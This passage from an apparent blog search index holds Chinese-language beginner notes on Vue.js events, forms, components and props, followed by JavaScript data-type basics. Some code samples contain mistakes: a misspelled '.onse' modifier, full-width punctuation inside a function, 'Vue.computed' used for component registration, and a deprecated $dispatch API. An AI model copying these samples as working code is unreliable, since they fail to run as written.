id="v-on"><a href="#v-on" class="headerlink" title="v-on"></a>v-on</h3><blockquote><h4 id="对事件进行绑定"><a href="#对事件进行绑定" class="headerlink" title="对事件进行绑定"></a>对事件进行绑定</h4></blockquote><pre class=" language-vue"><code class="language-vue"><div id="on">    <p>{{ message }}</p>    <button v-on:click="handle">提交</button></div><script>    var app = new Vue({        el:"#on",        data:{            message:'Hello Vue.js!'        },        methods: {            handle: function() {                this.message = this.message.split('').reverse().join('')            }        },    })</script></code></pre><h4 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h4><ul><li><strong>.stop</strong></li><li><strong>.prevent</strong></li><li><strong>.capture</strong></li><li><strong>.self</strong></li><li><strong>.once</strong></li></ul><pre class=" language-vue"><code class="language-vue">//阻止单击事件冒泡<a @click.stop='xxxx'></a>//提交事件不再重载页面<form @submit.prevent='xxx'></form>// 修饰符串联<form @submit.stop.prevent='xxx'></form>//添加事件侦听器时使用事件捕获器<div @click.capture='xxx'></div>//只当事件在该元素本身（而不是子元素)触发时触发回调<div @click.self='xxx'></div>// 只触发一次<div @click.onse='xxx'></div></code></pre><h4 id="KeyCode"><a href="#KeyCode" class="headerlink" title="KeyCode"></a>KeyCode</h4><ul><li><strong>.enter</strong></li><li><strong>.tab</strong></li><li><strong>.delete</strong></li><li><strong>.esc</strong></li><li><strong>.space</strong></li><li><strong>.up</strong></li><li><strong>.down</strong></li><li><strong>.left</strong></li><li><strong>.right</strong></li></ul><hr><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p><strong>将一个商品List制作出一个表格，可以调整数量，并计算出总价格。</strong></p><pre class=" language-vue"><code class="language-vue"><!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <title>Title</title>    <script src="https://cdn.bootcss.com/vue/2.6.10/vue.js"></script></head><body>    <div id="app">        <table border="1">            <thead>                <tr>                    <th></th>                    <th>商品名称</th>                    <th>商品价格</th>                    <th>商品数量</th>                    <th>操作</th>                </tr>            </thead>            <tbody>                <tr v-for="(tb,index) in list">                    <td>{{index+1}}</td>                    <td>{{tb.name}}</td>                    <td>{{tb.price}}</td>                    <td>                        <button @click="reduce(index)">-</button>                        {{tb.count}}                        <button @click="addcount(index)">+</button>                    </td>                    <td>                        <button @click="removevalue(index)">移除</button>                    </td>                </tr>            </tbody>        </table>        <div>总价格：{{allprice}}</div>    </div><script>    var app = new Vue({        el: '#app',        data: {            list: [                {                    name: 'ipad',                    price: 5000,                    count: 4                },                {                    name: 'iphone',                    price: 6000,                    count: 1                },                {                    name: 'HuaWei',                    price: 5000,                    count: 5                },                {                    name: 'xiaomi',                    price: 4000,                    count: 3                }            ]        },        methods: {            reduce: function (index) {                if (this.list[index].count === 1) return;                this.list[index].count --;            },            addcount: function (index) {                this.list[index].count ++ ;            },            removevalue: function (index) {                this.list.splice(index,1) ;            }        },        computed: {            allprice: function () {                var total = 0;                for (var i = 0;i < this.list.length;i++){                    var iteam = this.list[i];                    total += iteam.price * iteam.count;                }                return total.toString();            }        }    })</script></body></html></code></pre><hr><h2 id="表单与v-model"><a href="#表单与v-model" class="headerlink" title="表单与v-model"></a>表单与v-model</h2><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><pre class=" language-vue"><code class="language-vue"><div id='app'>    <input type='text' v-model='message'>    {{message}}</div><script>    var app = new Vue({        el: '#app',        data: {            message: ''        }    })</script></code></pre><p><strong>v-model也支持语法糖，可以将v-model改成@input</strong></p><pre class=" language-vue"><code class="language-vue"><div id='app'>    <input type='text' @input='inputinfo'>    {{message}}</div><script>    var app = new Vue({        el: '#app',        data: {            message: ''        },        methods: {            inputinfo: function(e){                this.message = e.target.value;            }        }    })</script></code></pre><h4 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h4><p><strong>当单选按钮时，不需要使用v-model，使用v-bind绑定一个布尔类型的值。</strong></p><pre class=" language-vue"><code class="language-vue"><div id='app'>    <input type='radio' :checked='picked'>    <label>单选按钮</label></div><script>    var app = new Vue({        el: '#app',        data: {            picked: true        }    })</script></code></pre><p><strong>如果是组合使用来实现互斥的效果，就需要v-model配合value来实现了</strong></p><pre class=" language-vue"><code class="language-vue"><!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <title>Title</title>    <script src="https://cdn.bootcss.com/vue/2.6.10/vue.js"></script></head><body>    <div id="app">        <input type="radio" v-model="checked" value="html">        <label for="html">HTML</label><br>        <input type="radio" v-model="checked" value="js">        <label for="js">Js</label><br>        <input type="radio" v-model="checked" value="css">        <label for="css">css</label><br>        <p>选择的是：{{checked}}</p>    </div>    <script>        var app = new Vue({            el: '#app',            data: {                checked: 'js'            }        })    </script></body></html></code></pre><h4 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h4><pre class=" language-vue"><code class="language-vue"><!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <title>Title</title>    <script src="https://cdn.bootcss.com/vue/2.6.10/vue.js"></script></head><body><div id="app">    <input type="checkbox" v-model="checked" value="html">    <label for="html">Html</label><br>    <input type="checkbox" v-model="checked" value="js">    <label for="js">Js</label><br>    <input type="checkbox" v-model="checked" value="css">    <label for="css">Css</label><br>    <p>选择的是：{{checked}}</p></div><script>    var app = new Vue({       el: '#app',       data: {           checked: ['html','js']       }    });</script></body></html></code></pre><h4 id="选择列表"><a href="#选择列表" class="headerlink" title="选择列表"></a>选择列表</h4><pre class=" language-vue"><code class="language-vue"><!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <title>Title</title>    <script src="https://cdn.bootcss.com/vue/2.6.10/vue.js"></script></head><body>    <div id="app">        <select name="" id="" v-model="checked" multiple>            <option value="html">HTML</option>            <option value="js">Js</option>            <option value="css">Css</option>        </select>        <p>选择的是：{{checked}}</p>    </div>    <script>        var app = new Vue({           el: '#app',           data: {               checked: ['js','css']           }        });    </script></body></html></code></pre><p><strong>结合v-bind来动态输出</strong></p><pre class=" language-vue"><code class="language-vue"><!DOCTYPE html> <html lang="en"><head>    <meta charset="UTF-8">    <title>Title</title>    <script src="https://cdn.bootcss.com/vue/2.6.10/vue.js"></script></head><body>    <div id="app">        <select name="" id="" v-model="checked">            <option v-for="option in options" :value="option.value">{{option.text}}</option>        </select>        <p>选择的是：{{checked}}</p>    </div>    <script>        var app = new Vue({            el: '#app',            data: {                checked: 'html',                options: [                    {                        text: 'Html',                        value: 'html'                    },                    {                        text: 'Js',                        value: 'js'                    },                    {                        text: 'Css',                        value: 'css'                    }                ]            }        });    </script></body></html></code></pre><h3 id="绑定值"><a href="#绑定值" class="headerlink" title="绑定值"></a>绑定值</h3><h4 id="单选按钮-1"><a href="#单选按钮-1" class="headerlink" title="单选按钮"></a>单选按钮</h4><pre class=" language-vue"><code class="language-vue"><!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <title>Title</title>    <script src="https://cdn.bootcss.com/vue/2.6.10/vue.js"></script></head><body>    <div id="app">        <input type="radio" v-model="checked" :value="value">        <label for="">单选框</label>        <p>{{checked}}</p>        <p>{{value}}</p>    </div>    <script>        var app = new Vue({            el: '#app',            data: {                checked: false,                value: 123            }        })    </script></body></html></code></pre><h4 id="复选框-1"><a href="#复选框-1" class="headerlink" title="复选框"></a>复选框</h4><pre class=" language-vue"><code class="language-vue"><!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <title>Title</title>    <script src="https://cdn.bootcss.com/vue/2.6.10/vue.js"></script></head><body>    <div id="app">        <input type="checkbox" v-model="checked" :true-value="value1" :false-value="value2">        <label for="">复选框</label>        <p>{{checked}}</p>        <p>{{value1}}</p>        <p>{{value2}}</p>    </div>    <script>        var app = new Vue({            el: '#app',            data: {               checked: false,                value1: 'a',                value2: 'b'            }        });    </script></body></html></code></pre><h4 id="选择列表-1"><a href="#选择列表-1" class="headerlink" title="选择列表"></a>选择列表</h4><pre class=" language-vue"><code class="language-vue"><!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <title>Title</title>    <script src="https://cdn.bootcss.com/vue/2.6.10/vue.js"></script></head><body>    <div id="app">        <select name="" id="" v-model="selected">            <option :value="{ number: 123}">123</option>        </select>        {{selected.number}}    </div>    <script>        var app = new Vue({            el: '#app',            data: {                selected: ''            }        });    </script></body></html></code></pre><h3 id="修饰符-1"><a href="#修饰符-1" class="headerlink" title="修饰符"></a>修饰符</h3><ul><li><p><strong>.lazy</strong></p><p><strong>使用了lazy将不再是实时同步，需要失焦或者按enter才会实行同步</strong></p><pre class=" language-vue"><code class="language-vue"><!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <title>Title</title>    <script src="https://cdn.bootcss.com/vue/2.6.10/vue.js"></script></head><body>    <div id="app">        <input type="text" v-model.lazy="message">        {{message}}    </div>    <script>        var app = new Vue({            el: '#app',            data: {                message: ''            }        })    </script></body></html></code></pre></li><li><p><strong>.number</strong></p><p><strong>可以将输入的装换成Number类型。如果不使用时虽然我们输入的是数字，但它会被转成string类型。</strong></p><pre class=" language-vue"><code class="language-vue"><div id="app">    <input type="text" v-model.number="message">    {{typeof message}}</div><script>    var app = new Vue({        el: '#app',        data: {            message: '123'        }    })</script></code></pre></li><li><p><strong>.trim</strong></p><p><strong>可以自动过滤掉首尾输入的空格。</strong></p><pre class=" language-vue"><code class="language-vue"><div id="app">    <input type="text" v-model.trim="message">    {{ message}}</div><script>    var app = new Vue({        el: '#app',        data: {            message: ''        }    })</script></code></pre></li></ul><hr><h2 id="组件详解"><a href="#组件详解" class="headerlink" title="组件详解"></a>组件详解</h2><h3 id="组件与复用"><a href="#组件与复用" class="headerlink" title="组件与复用"></a>组件与复用</h3><h4 id="组件使用"><a href="#组件使用" class="headerlink" title="组件使用"></a>组件使用</h4><blockquote><h5 id="组件需要注册后才可以使用。注册有两种：全局注册和局部注册。下面是全局注册的例子："><a href="#组件需要注册后才可以使用。注册有两种：全局注册和局部注册。下面是全局注册的例子：" class="headerlink" title="组件需要注册后才可以使用。注册有两种：全局注册和局部注册。下面是全局注册的例子："></a>组件需要注册后才可以使用。注册有两种：全局注册和局部注册。下面是全局注册的例子：</h5></blockquote><pre class=" language-vue"><code class="language-vue">Vue.component('组件名称',{})</code></pre><p><strong>在组件选项中添加template就可以显示组件内容啦。</strong></p><pre class=" language-vue"><code class="language-vue"><div id="app">    <my-component></my-component></div><script>    Vue.component('my-component',{        template: '<div>这是组件</div>'    })    var app = new Vue({        el: '#app'    })</script></code></pre><p><strong>渲染得到的是:</strong></p><pre class=" language-vue"><code class="language-vue"><div id="#app">    <div>        这是组件    </div></div></code></pre><blockquote><h5 id="使用components可以实现局部注册。注册后的组件只能在组件的作用域下生效。"><a href="#使用components可以实现局部注册。注册后的组件只能在组件的作用域下生效。" class="headerlink" title="使用components可以实现局部注册。注册后的组件只能在组件的作用域下生效。"></a>使用components可以实现局部注册。注册后的组件只能在组件的作用域下生效。</h5></blockquote><pre class=" language-vue"><code class="language-vue"><div id="app">    <my-component></my-component></div><script>     var child = "<div>这是组件</div>"    var app = new Vue({        el: '#app',        components: {            'my-component': child        }    })</script></code></pre><p><strong>渲染得到的是:</strong></p><pre class=" language-vue"><code class="language-vue"><div id="#app">    <div>        这是组件    </div></div></code></pre><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p><strong>除了template外，我们还可以使用data,computed等。但是使用data时，和实例不同。data必须是函数，然后讲值return出去。</strong></p><pre class=" language-vue"><code class="language-vue"><div id="app">    <my-component></my-component></div><script>    Vue.component('my-component',{        template: '<div>{{message}}</div>',        data: function （）{            return {                message： '这是组件'            }        }    })    var app = new Vue({        el: '#app'    })</script></code></pre><h3 id="使用props传递参数"><a href="#使用props传递参数" class="headerlink" title="使用props传递参数"></a>使用props传递参数</h3><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><blockquote><h5 id="通常父组件的模板中包含子组件，父组件要正向地向子组件传递数据或参数，子组件接收到后根据参数的不同来渲染不同的内容或执行操作。这个正向传递数据的过程就是通过-props-来实现的。"><a href="#通常父组件的模板中包含子组件，父组件要正向地向子组件传递数据或参数，子组件接收到后根据参数的不同来渲染不同的内容或执行操作。这个正向传递数据的过程就是通过-props-来实现的。" class="headerlink" title="通常父组件的模板中包含子组件，父组件要正向地向子组件传递数据或参数，子组件接收到后根据参数的不同来渲染不同的内容或执行操作。这个正向传递数据的过程就是通过 props 来实现的。"></a>通常父组件的模板中包含子组件，父组件要正向地向子组件传递数据或参数，子组件接收到后根据参数的不同来渲染不同的内容或执行操作。这个正向传递数据的过程就是通过 props 来实现的。</h5></blockquote><p><strong>使用选项 prop 来声明需要从父级接收的数据， prop 的值可以是两种，一种是字符串数组，一种是对象。</strong></p><pre class=" language-vue"><code class="language-vue"><div id="app">    <my-component message="这是组件"></my-component></div><script>    Vue.component('my-component',{        props: ['message'],        template: '<div>{{message}}</div>'    })    var app = new Vue({        el: '#app'    })</script></code></pre><p><strong>渲染得到的是:</strong></p><pre class=" language-vue"><code class="language-vue"><div id="#app">    <div>        这是组件    </div></div></code></pre><p><strong>当要使用Dom模板时，驼峰命名的props名称需要转为短横分隔命名。</strong></p><pre class=" language-vue"><code class="language-vue"><div id="app">    <my-component Component-Text="这是组件"></my-component></div><script>    Vue.component('my-component',{        props: ['ComponentText'],        template: '<div>{{ComponentText}}</div>'    })    var app = new Vue({        el: '#app'    })</script></code></pre><p><strong>渲染得到的是：</strong></p><pre class=" language-vue"><code class="language-vue"><div id="#app">    <div>        这是组件    </div></div></code></pre><p><strong>有时候传递的参数不是固定的，这时候我们需要使用v-bind来动态绑定props的值。</strong></p><pre class=" language-vue"><code class="language-vue">    <div id="app">        <input type="text" v-model="inputtext">        <my-component v-bind:message="inputtext"></my-component>    </div>    <script>        Vue.component('my-component',{            props: ['message'],            template: '<div>{{message}}</div>'        })        var app = new Vue({           el: '#app',            data: {               inputtext: '这是组件'            }        });    </script></code></pre><h4 id="单项数据流"><a href="#单项数据流" class="headerlink" title="单项数据流"></a>单项数据流</h4><blockquote><h5 id="Vue2-x-通过-props-传递数据是单向的了，-也就父组件数据变化时会传递给子组件，但是反过来不行。"><a href="#Vue2-x-通过-props-传递数据是单向的了，-也就父组件数据变化时会传递给子组件，但是反过来不行。" class="headerlink" title="Vue2.x 通过 props 传递数据是单向的了， 也就父组件数据变化时会传递给子组件，但是反过来不行。"></a>Vue2.x 通过 props 传递数据是单向的了， 也就父组件数据变化时会传递给子组件，但是反过来不行。</h5></blockquote><pre class=" language-vue"><code class="language-vue"><div id="app">        <mycomponent :initcount="1"></mycomponent>    </div>    <script>        Vue.component('mycomponent',{           props: ['initcount'],            template: '<div>{{count}}</div>',            data: function () {                return {                    count: this.initcount                }            }        });        var app = new Vue({           el: '#app',        });    </script></code></pre><pre class=" language-vue"><code class="language-vue"><div id="app">        <mycomponent :width="100"></mycomponent>    </div>    <script>        Vue.component('mycomponent',{           props: ['width'],            template: '<div :style="style">这是组件</div>',           computed: {                style: function () {                    return {                        width: this.width + 'px'                    }                }           }        });        var app = new Vue({           el: '#app'        });</code></pre><h4 id="数据验证"><a href="#数据验证" class="headerlink" title="数据验证"></a>数据验证</h4><p><strong>验证类型：</strong></p><pre><code>- **String**- **Number**- **Boolean**- **Object**- **Array**- **Function**</code></pre><pre class=" language-vue"><code class="language-vue">    Vue.component('mycomponent',{        props: {            // 必须是数字类型            propA: Number,            // 必须字符串或者数字类型            propB: [String,Number],            // 布尔类型。如果没定义，默认为true            propC: {                type: Boolean,                default: true            },            // 数字类型，必须上传            propD: {                type: Number,                required: true            },            // 如果是一个数组或者对象，必须要是一个函数来返回            propE: {                type: Array,                default: function () {                    return []                }            }        }    });</code></pre><h3 id="组件通信"><a href="#组件通信" class="headerlink" title="组件通信"></a>组件通信</h3><h4 id="自定义事件"><a href="#自定义事件" class="headerlink" title="自定义事件"></a>自定义事件</h4><blockquote><h5 id="子组件用-emit（）来触发事件，父组件用-on（）来监昕子组件的事件。"><a href="#子组件用-emit（）来触发事件，父组件用-on（）来监昕子组件的事件。" class="headerlink" title="子组件用 $emit（）来触发事件，父组件用$on（）来监昕子组件的事件。"></a>子组件用 $emit（）来触发事件，父组件用$on（）来监昕子组件的事件。</h5></blockquote><pre class=" language-vue"><code class="language-vue"><div id="app">        <p>总数：{{total}}</p>        <mycomponent @increase="GetTotal" @reduce="GetTotal"></mycomponent>    </div>    <script>        Vue.component('mycomponent',{            template: '<div><button @click="InCrease">+1</button>                         <button @click="Reduce">-1</button></div>',            data: function () {                return {                    counter: 0                }            },            methods: {                InCrease: function () {                    this.counter ++;                    this.$emit('increase',this.counter);                },                Reduce: function () {                    this.counter --;                    this.$emit('reduce',this.counter);                }            }        });        var app = new Vue({           el: '#app',           data: {               total: 0           },            methods: {                GetTotal: function (total) {                    this.total = total;                }            }        });    </script></code></pre><h4 id="使用v-model"><a href="#使用v-model" class="headerlink" title="使用v-model"></a>使用v-model</h4><pre class=" language-vue"><code class="language-vue">    <div id="app">        <p>总数：{{total}}</p>        <mycomponent v-model="total"></mycomponent>    </div>    <script>        Vue.component('mycomponent',{           template: '<button @click="hander">+1</button>',            data: function () {                return {                    counter: 0                }            },            methods: {               hander: function () {                   this.counter++;                   this.$emit('input',this.counter);               }            }        });        var app = new Vue({           el: '#app',            data: {                total: 0            }        });    </script></code></pre><h4 id="非父子组件通信"><a href="#非父子组件通信" class="headerlink" title="非父子组件通信"></a>非父子组件通信</h4><blockquote><h5 id="非父子组件通信通常有两种。①兄弟组件。②跨多级组件。"><a href="#非父子组件通信通常有两种。①兄弟组件。②跨多级组件。" class="headerlink" title="非父子组件通信通常有两种。①兄弟组件。②跨多级组件。"></a>非父子组件通信通常有两种。①兄弟组件。②跨多级组件。</h5></blockquote><h5 id="dispatch-此功能已经废弃"><a href="#dispatch-此功能已经废弃" class="headerlink" title="$dispatch() 此功能已经废弃"></a>$dispatch() 此功能已经废弃</h5><blockquote><h6 id="dispatch-用于向上级派发事件，只要是他的父级都可以在vue实例的event接收。"><a href="#dispatch-用于向上级派发事件，只要是他的父级都可以在vue实例的event接收。" class="headerlink" title="$dispatch()用于向上级派发事件，只要是他的父级都可以在vue实例的event接收。"></a>$dispatch()用于向上级派发事件，只要是他的父级都可以在vue实例的event接收。</h6></blockquote><pre class=" language-vue"><code class="language-vue">    <div id="app">        {{message}}        <mycomponent></mycomponent>    </div>    <script>        Vue.computed('mycomponent',{           template: '<button @click="sedmess">传送消息</button>' ,            methods: {               sedmess: function () {                   this.$dispatch('sed-message',"来自内部消息");               }            }        });        var app = new Vue({            el: '#app',            data: {                message: ''            },            event: {                'sed-message': function (msg) {                    this.message = msg;                }            }        });    </script></code></pre><h3 id="使用slot发布内容"><a href="#使用slot发布内容" class="headerlink" title="使用slot发布内容"></a>使用slot发布内容</h3><h4 id="什么是slot"><a href="#什么是slot" class="headerlink" title="什么是slot"></a>什么是slot</h4><blockquote><h5 id="当我们多个组件需要组合使用，混合父组件的内容与子组件的模板时，就会用到slot，这个过程叫做内容分发。"><a href="#当我们多个组件需要组合使用，混合父组件的内容与子组件的模板时，就会用到slot，这个过程叫做内容分发。" class="headerlink" title="当我们多个组件需要组合使用，混合父组件的内容与子组件的模板时，就会用到slot，这个过程叫做内容分发。"></a>当我们多个组件需要组合使用，混合父组件的内容与子组件的模板时，就会用到slot，这个过程叫做内容分发。</h5></blockquote><ul><li><p><strong><app>组件不知道他的挂载点会有什么东西，挂载点的内容由<app>父组件决定。</app></app></strong></p></li><li><p><strong><app>组件很有可能有他自己的模板。</app></strong></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScriptの数据类型</title>
      <link href="/2019/06/06/javascript-shu-ju-lei-xing/"/>
      <url>/2019/06/06/javascript-shu-ju-lei-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScriptの数据类型"><a href="#JavaScriptの数据类型" class="headerlink" title="JavaScriptの数据类型"></a>JavaScriptの数据类型</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><strong>数值(number)：整数和小数</strong></li><li><strong>字符串(string):文本</strong></li><li><strong>布尔值(boolean)：真假</strong></li><li><strong>undefined：表示未定义或者不存在</strong></li><li><strong>null：表示空值</strong></li><li><strong>对象(object)：各种值组成的集合</strong></li></ul><p><strong>利用typeof可以返回数据类型</strong></p><h2 id="null和undefined"><a href="#null和undefined" class="headerlink" title="null和undefined"></a>null和undefined</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><blockquote><h4 id="null与undefined都可以表示“没有”，含义非常相似。"><a href="#null与undefined都可以表示“没有”，含义非常相似。" class="headerlink" title="null与undefined都可以表示“没有”，含义非常相似。"></a>null与undefined都可以表示“没有”，含义非常相似。</h4></blockquote><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> undefined<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//或</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span></code></pre><p><strong>区别：null是表示一个空对象，转为数值时为0；undefined是表示此处未定义的原始值，转为数值时为NaN。</strong></p><h2 id="布尔值"><a href="#布尔值" class="headerlink" title="布尔值"></a>布尔值</h2><blockquote><p>布尔值代表真和假两个状态。</p></blockquote><p>下列运算符会返回布尔值：</p><ul><li><strong>前置逻辑运算符：!</strong></li><li><strong>相等运算符：===，！==，==，！=</strong></li><li><strong>比较运算符：&gt;,&gt;=,&lt;,&lt;=</strong></li></ul><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><blockquote><h4 id="字符串就是零个或者多个字符组成的，放在单引号或者双引号之中。"><a href="#字符串就是零个或者多个字符组成的，放在单引号或者双引号之中。" class="headerlink" title="字符串就是零个或者多个字符组成的，放在单引号或者双引号之中。"></a>字符串就是零个或者多个字符组成的，放在单引号或者双引号之中。</h4></blockquote><h4 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h4><blockquote><h5 id="反斜杠-在字符串内有特殊含义，用来表示一些特殊字符，所以又称为转义字符。"><a href="#反斜杠-在字符串内有特殊含义，用来表示一些特殊字符，所以又称为转义字符。" class="headerlink" title="反斜杠()在字符串内有特殊含义，用来表示一些特殊字符，所以又称为转义字符。"></a>反斜杠()在字符串内有特殊含义，用来表示一些特殊字符，所以又称为转义字符。</h5></blockquote><ul><li><strong>\0 : null(\u000)</strong></li><li><strong>\b : 后退键(\u0008)</strong></li><li><strong>\f : 换页符(\u000C)</strong></li><li><strong>\n : 换行符(\u000A)</strong></li><li><strong>\r : 回车键(\u000D)</strong></li><li><strong>\t : 制表符(\u0009)</strong></li><li><strong>\v : 垂直制表符(\u000B)</strong></li><li><strong>\‘  : 单引号(\u0027)</strong></li><li><strong>\“ : 双引号(\u0022)</strong></li><li><strong>\\ : 反斜杠(\u005C)</strong></li></ul><h4 id="字符串与数组"><a href="#字符串与数组" class="headerlink" title="字符串与数组"></a>字符串与数组</h4><blockquote><p>字符串可以被视为字符数组，因此可以使用数组的方括号运算符，用来返回某个位置的字符</p></blockquote><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">></span> <span class="token keyword">var</span> s <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">;</span><span class="token operator">></span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token string">'h'</span><span class="token operator">></span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token string">'e'</span><span class="token operator">></span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token string">'l'</span><span class="token operator">></span> s<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token string">'l'</span><span class="token operator">></span> s<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token string">'o'</span><span class="token operator">></span> s<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>undefined</code></pre><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> s <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">;</span><span class="token keyword">delete</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>s <span class="token comment" spellcheck="true">// "hello"</span>s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">;</span>s <span class="token comment" spellcheck="true">// "hello"</span>s<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'!'</span><span class="token punctuation">;</span>s <span class="token comment" spellcheck="true">// "hello"</span></code></pre><p><strong>上述代码表示,字符串内部的的那个字符无法改变和增删，这些操作会默默地失败。</strong></p><h4 id="length属性"><a href="#length属性" class="headerlink" title="length属性"></a>length属性</h4><pre class=" language-JavaScript"><code class="language-JavaScript">var s = 'hello';s.length // 5s.length = 3;s.length // 5s.length = 7;s.length // 5</code></pre><p><strong>length属性返回字符串的长度，该属性是不可以修改的。</strong></p><h4 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h4><p><strong>JavaScript使用Unicode字符集</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> s <span class="token operator">=</span> <span class="token string">'\u00A9'</span><span class="token punctuation">;</span>s <span class="token comment" spellcheck="true">// "©"</span></code></pre><h4 id="Base64转码"><a href="#Base64转码" class="headerlink" title="Base64转码"></a>Base64转码</h4><p><strong>有时候文本里面包含一些不可打印的符号，比如ASCII码0到31的符号都打印不出来，这时候可以使用Base64编码。另一个场景是，有时候需要以文本格式传递二进制数据，那么也可以使用Base64编码。</strong></p><ul><li><strong>btoa():任意值转为Base64编码。</strong></li><li><strong>atob()：Base编码转为原来的值。</strong></li></ul><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">'Hello World!'</span><span class="token punctuation">;</span><span class="token function">btoa</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// "SGVsbG8gV29ybGQh"</span><span class="token function">atob</span><span class="token punctuation">(</span><span class="token string">'SGVsbG8gV29ybGQh'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// "Hello World!"</span></code></pre><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><h4 id="生成方法"><a href="#生成方法" class="headerlink" title="生成方法"></a>生成方法</h4><blockquote><h5 id="对象-object-就是一组“键值对”-key-value-的集合，是一种无序的复合数据集合。"><a href="#对象-object-就是一组“键值对”-key-value-的集合，是一种无序的复合数据集合。" class="headerlink" title="对象(object)就是一组“键值对”(key-value)的集合，是一种无序的复合数据集合。"></a>对象(object)就是一组“键值对”(key-value)的集合，是一种无序的复合数据集合。</h5></blockquote><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>  foo<span class="token punctuation">:</span> <span class="token string">'Hello'</span><span class="token punctuation">,</span>  bar<span class="token punctuation">:</span> <span class="token string">'World'</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h4 id="键名"><a href="#键名" class="headerlink" title="键名"></a>键名</h4><blockquote><p>对象的所有键名都是字符串，所有加不加引号都可以。</p></blockquote><h4 id="对象的引用"><a href="#对象的引用" class="headerlink" title="对象的引用"></a>对象的引用</h4><pre class=" language-javasc"><code class="language-javasc">var v1 = {};var v2 = v1;v1.a = 1;v2.a// 1</code></pre><h3 id="属性的操作"><a href="#属性的操作" class="headerlink" title="属性的操作"></a>属性的操作</h3><h4 id="属性的读取"><a href="#属性的读取" class="headerlink" title="属性的读取"></a>属性的读取</h4><p><strong>读取对象的属性，有两种方法，一种的使用点运算符，还有一种是使用方括号运算符。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>  p<span class="token punctuation">:</span> <span class="token string">'Hello World'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>obj<span class="token punctuation">.</span>p <span class="token comment" spellcheck="true">// "Hello World"</span>obj<span class="token punctuation">[</span><span class="token string">'p'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">// "Hello World"</span></code></pre><h4 id="属性赋值"><a href="#属性赋值" class="headerlink" title="属性赋值"></a>属性赋值</h4><p>点运算符和方括号运算符，不仅可以用来读取值，还可以用来赋值。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>obj<span class="token punctuation">.</span>foo <span class="token operator">=</span> <span class="token string">'Hello'</span><span class="token punctuation">;</span>obj<span class="token punctuation">[</span><span class="token string">'bar'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'World'</span><span class="token punctuation">;</span></code></pre><h4 id="属性的查看"><a href="#属性的查看" class="headerlink" title="属性的查看"></a>属性的查看</h4><p><strong>查看一个对象本身的所有属性，可以使用Object.keys方法。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>  key1<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>  key2<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">;</span>Object<span class="token 